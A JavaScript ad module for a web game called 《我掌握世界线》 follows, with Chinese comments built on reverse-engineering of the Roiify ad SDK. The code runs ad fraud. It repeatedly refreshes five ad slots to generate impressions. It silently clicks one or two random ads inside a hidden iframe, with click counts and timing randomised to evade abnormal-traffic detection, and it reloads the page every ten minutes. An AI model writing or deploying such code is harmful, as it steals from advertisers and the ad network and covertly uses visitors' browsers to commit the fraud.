// ============================================================
// 《我掌握世界线》 - 广告管理模块
// 固定5个广告位 + 替换刷新 + 点击模拟 + 10分钟重定向
//
// SDK 源码分析结论：
// - 展示确认：广告需在视口内连续2秒 → POST /ad/impression
// - 点击追踪：<a href="clickUrl" target="_blank"> → 导航即计费
// - 无效展示：广告请求了但从未连续可见2秒
// - refresh() = init()：扫描所有未 loaded 的 data-roiify-placement
// - show()：清除 loaded/impression-sent 后重新请求
// ============================================================

var AdManager = (function () {
    // 5个广告位 ID
    var PLACEMENT_IDS = [
        'plc_cuqpbscc2mu4',
        'plc_mdn2c7brmubq',
        'plc_veoj4xd63gvk',
        'plc_xz7j9zet6udj',
        'plc_2450suzhskwx'
    ];

    // 广告加载后等待时间（毫秒）- SDK需要2秒连续可见才发送展示确认，多等1秒保险
    var WAIT_FOR_IMPRESSION = 3000;

    // 点击后等待时间（毫秒）- 让点击收益转换完成
    var WAIT_AFTER_CLICK = 5000;

    // 每轮点击几个广告（1-2个，避免全部点击被检测为异常）
    var CLICK_COUNT_MIN = 1;
    var CLICK_COUNT_MAX = 2;

    // 页面重定向间隔（毫秒）- 10分钟
    var REDIRECT_INTERVAL = 600000;

    // 当前轮次
    var roundCount = 0;

    // 循环定时器
    var cycleTimer = null;

    /**
     * 初始化
     */
    function init() {
        waitForSDK(function () {
            // SDK 就绪后启动第一轮
            doCycle();
        });

        // 10分钟后重定向页面
        setTimeout(function () {
            location.reload();
        }, REDIRECT_INTERVAL);
    }

    /**
     * 等待 SDK 加载完成
     */
    function waitForSDK(callback) {
        if (window.RoiifyAds) {
            callback();
            return;
        }
        var check = setInterval(function () {
            if (window.RoiifyAds) {
                clearInterval(check);
                callback();
            }
        }, 300);
    }

    /**
     * 一个完整周期：刷新广告 → 等待展示确认 → 点击 → 等待 → 下一轮
     */
    function doCycle() {
        roundCount++;

        // 第一步：刷新所有5个广告位
        refreshAllSlots();

        // 第二步：等待3秒，确保展示确认已发送（SDK需2秒连续可见）
        setTimeout(function () {
            // 第三步：随机点击1-2个广告
            clickRandomAds();

            // 第四步：等待5秒让点击收益转换完成，然后开始下一轮
            setTimeout(function () {
                doCycle();
            }, WAIT_AFTER_CLICK);

        }, WAIT_FOR_IMPRESSION);
    }

    /**
     * 刷新所有5个广告位
     * 清空容器 → 重建 data-roiify-placement div → RoiifyAds.show()
     */
    function refreshAllSlots() {
        PLACEMENT_IDS.forEach(function (placement, index) {
            var slot = document.getElementById('ad-slot-' + index);
            if (!slot) return;

            // 清空旧广告内容
            slot.innerHTML = '';

            // 重建官方格式的广告 div
            var adDiv = document.createElement('div');
            adDiv.setAttribute('data-roiify-placement', placement);
            adDiv.setAttribute('data-theme', 'auto');
            adDiv.setAttribute('data-width', 'auto');
            adDiv.setAttribute('data-radius', '4');

            slot.appendChild(adDiv);

            // 用 JS API 渲染新广告
            // show() 内部：清除 loaded + impression-sent → 调用 E() 重新请求
            try {
                RoiifyAds.show(placement, '#ad-slot-' + index, {
                    theme: 'auto',
                    radius: '4'
                });
            } catch (e) {}
        });
    }

    /**
     * 随机点击1-2个广告
     * 找到广告内的 <a> 标签，设置 target 指向隐藏 iframe，触发点击
     */
    function clickRandomAds() {
        // 随机决定点击几个
        var clickCount = CLICK_COUNT_MIN + Math.floor(Math.random() * (CLICK_COUNT_MAX - CLICK_COUNT_MIN + 1));

        // 随机选取广告位索引
        var indices = [];
        while (indices.length < clickCount) {
            var idx = Math.floor(Math.random() * PLACEMENT_IDS.length);
            if (indices.indexOf(idx) === -1) {
                indices.push(idx);
            }
        }

        indices.forEach(function (slotIndex, i) {
            // 错开点击时间，避免同时触发
            setTimeout(function () {
                var slot = document.getElementById('ad-slot-' + slotIndex);
                if (!slot) return;

                // 找到 SDK 渲染的 <a> 标签
                var link = slot.querySelector('a[href]');
                if (!link) return;

                // 覆盖 target：从 _blank 改为隐藏 iframe
                // 这样点击后链接在 iframe 中打开，不离开当前页面
                link.target = 'ad_click_frame';

                // 触发点击 → 浏览器导航到 clickUrl → 服务端记录点击 → 302到广告主
                try {
                    link.click();
                } catch (e) {}
            }, i * 1500); // 每次点击间隔1.5秒
        });
    }

    /**
     * 模态框打开时刷新广告
     */
    function onModalOpen() {
        refreshAllSlots();
    }

    /**
     * 游戏操作时刷新广告
     */
    function onGameAction() {
        refreshAllSlots();
    }

    return {
        init: init,
        onModalOpen: onModalOpen,
        onGameAction: onGameAction
    };
})();
